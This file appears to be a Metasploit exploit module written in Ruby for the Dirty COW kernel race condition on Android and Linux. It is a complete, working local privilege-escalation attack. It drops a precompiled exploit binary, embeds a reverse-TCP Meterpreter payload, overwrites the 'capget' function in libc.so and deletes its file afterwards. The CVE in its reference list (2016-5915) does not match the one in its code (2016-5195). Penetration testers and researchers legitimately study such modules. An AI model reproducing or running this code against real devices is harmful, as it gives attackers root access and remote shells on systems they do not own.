##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android dirtycow Exploit",
        'Description'   => %q{
          A race condition was found in the way the Linux kernel's memory
          subsystem handled the copy-on-write (COW) breakage of private
          read-only memory mappings. An unprivileged local user could use
          this flaw to gain write access to otherwise read-only memory mappings
          and thus increase their privileges on the system.
          The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Phil Oester',  # discovery
          'timwr',        # metasploit module
        ],
        'References'    =>
        [
          [ 'CVE', '2016-5915' ],
          [ 'URL', 'http://dirtycow.ninja/' ],
        ],
        'DisclosureDate' => "Oct 20 2016",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        'Payload'        => { 'Space'    => 255 },
        "Arch"           => ARCH_ARMLE,
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
          'WfsDelay'     => 60,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { }]],
    }))
    register_options(
      [
        OptInt.new("ListenerTimeout", [ true, "The maximum number of seconds to wait for a session", 300]),
        OptString.new("Library", [ true, "The library file to overwrite", "/system/lib/libc.so"]),
        OptString.new("Function", [ true, "The library function to overwrite", "capget"]),
      ], self.class)
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195.elf" )
    exploit_data = File.read(local_file, {:mode => 'rb'})
    exploit_data.gsub!("\x90" * 4 + "\x00" * (payload_space - 4), payload.encoded)

    workingdir = session.fs.dir.getwd
    exploit_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(exploit_file, exploit_data)
    cmd_exec("chmod 700 #{exploit_file}")

    old_timeout = session.response_timeout
    session.response_timeout = datastore['ListenerTimeout']
    output = cmd_exec("#{exploit_file} #{datastore['Library']} #{datastore['Function']}")
    session.response_timeout = old_timeout
    print_status output
    session.fs.file.rm(exploit_file)
  end

end

